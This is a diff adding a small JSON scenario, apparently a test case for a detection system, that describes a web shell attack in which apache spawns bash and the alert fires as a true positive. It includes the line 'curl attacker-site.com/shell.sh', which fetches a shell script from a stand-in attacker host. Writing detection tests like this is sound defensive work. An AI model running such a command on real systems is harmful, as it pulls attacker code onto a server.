@@ -1,0 +1,18 @@
+{
+"scenario":"Web shell attack",
+
+"attacker_behavior":
+"Attacker executes shell commands through compromised web server",
+
+"parent_process":
+"apache",
+
+"child_process":
+"bash",
+
+"command":
+"curl attacker-site.com/shell.sh",
+
+"detection_result":
+"TRUE POSITIVE - ALERT GENERATED"
+}
